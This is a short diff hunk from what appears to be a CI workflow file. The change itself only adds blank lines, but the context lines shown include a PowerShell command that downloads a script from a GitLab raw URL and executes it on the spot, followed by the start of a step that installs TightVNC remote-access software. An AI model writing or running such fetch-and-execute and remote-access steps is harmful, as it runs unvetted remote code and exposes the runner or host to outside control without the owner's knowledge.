@@ -35,6 +35,8 @@ jobs:
         iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)
 
 
+
+
         
         try {
           Write-Host "📥 Installing TightVNC..."
